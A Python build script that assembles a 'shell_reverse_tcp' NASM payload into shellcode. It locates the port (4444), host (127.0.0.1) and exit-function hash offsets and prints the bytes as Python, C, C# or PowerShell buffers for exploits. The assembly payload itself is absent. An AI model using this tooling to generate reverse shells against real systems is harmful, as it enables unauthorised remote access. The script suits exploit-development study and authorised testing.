#!/usr/bin/env python3

import os
import sys
import time
from subprocess import Popen
from struct import pack

if os.path.exists("./bin/") is False:
    os.mkdir("./bin/")


def clean(dir="./bin/"):
    for root, dirs, files in os.walk(dir):
        for name in files:
            if name[-4:] == ".bin":
                os.remove(os.path.join(root, name))


def locate(src_file, dir="./src/"):
    for root, dirs, files in os.walk(dir):
        for name in files:
            if src_file == name:
                return root
    return None


def build(name):
    location = locate("%s.asm" % name)
    if location:
        input = os.path.normpath(os.path.join(location, name))
        output = os.path.normpath(os.path.join("./bin/", name))
        p = Popen(["nasm", "-f bin", "-O3", "-o %s.bin" % output, "%s.asm" % input])
        p.wait()
        xmit(name)
    else:
        print("[-] Unable to locate '%s.asm' in the src directory" % name)


def format_hex(data):
    return ", ".join(["0x%02x" % x for x in data])


def xmit_dump_python(data, length=16):
    dump = ""
    for i in range(0, len(data), length):
        bytes_chunk = data[i : i + length]
        hex_values = "".join(f"\\x{byte:02X}" for byte in bytes_chunk)
        dump += f"{hex_values}"
    print(f'buf = "{dump}"')


def xmit_dump_c(data, length=16):
    dump = ""
    for i in range(0, len(data), length):
        bytes = data[i : i + length]
        hex_values = format_hex(bytes)
        if i + length <= len(data):
            hex_values += ","
        dump += "    %s\n" % (hex_values)
    print("unsigned char buf[] = {\n" + dump + "};\n")


def xmit_dump_csharp(data, length=16):
    dump = ""
    for i in range(0, len(data), length):
        bytes = data[i : i + length]
        hex_values = format_hex(bytes)
        if i + length <= len(data):
            hex_values += ","
        dump += "        %s\n" % (hex_values)
    print("static byte[] buf = new byte[]\n    {\n" + dump + "    };")


def xmit_dump_powershell(data, length=16):
    dump = ""
    for i in range(0, len(data), length):
        bytes = data[i : i + length]
        hex_values = format_hex(bytes)
        if i + length <= len(data):
            hex_values += ","
        dump += "    %s\n" % (hex_values)
    print("$buf = @(" + dump + ")")


def xmit_offset(data, name, value):
    offset = data.find(value)
    if offset != -1:
        print("# %s Offset: %d" % (name, offset))


def xmit(name, dump_c=True):
    bin = os.path.normpath(os.path.join("./bin/", "%s.bin" % name))
    with open(bin, "rb") as f:
        data = f.read()
    print("# Name: %s\n# Length: %d bytes" % (name, len(data)))
    xmit_offset(data, "Port", pack(">H", 4444))  # 4444
    xmit_offset(data, "Host", pack(">L", 0x7F000001))  # 127.0.0.1
    xmit_offset(data, "ExitFunk", pack("<L", 0x0A2A1DE0))  # kernel32.dll!ExitThread
    xmit_offset(data, "ExitFunk", pack("<L", 0x56A2B5F0))  # kernel32.dll!ExitProcess
    xmit_offset(
        data, "ExitFunk", pack("<L", 0xEA320EFE)
    )  # kernel32.dll!SetUnhandledExceptionFilter
    xmit_offset(data, "ExitFunk", pack("<L", 0xE035F044))  # kernel32.dll!Sleep
    if dump_c:
        print()
        xmit_dump_python(data)


def main(argv=None):
    if not argv:
        argv = sys.argv
    if len(argv) == 1:
        print("Usage: build.py [clean|build]")
    else:
        print("# Built on %s\n" % (time.asctime(time.localtime())))
        if argv[1] == "clean":
            clean()
        elif argv[1] == "build":
            build("shell_reverse_tcp")
        else:
            print(f"Error: '{argv[1]}' is not a valid option.")


if __name__ == "__main__":
    main()
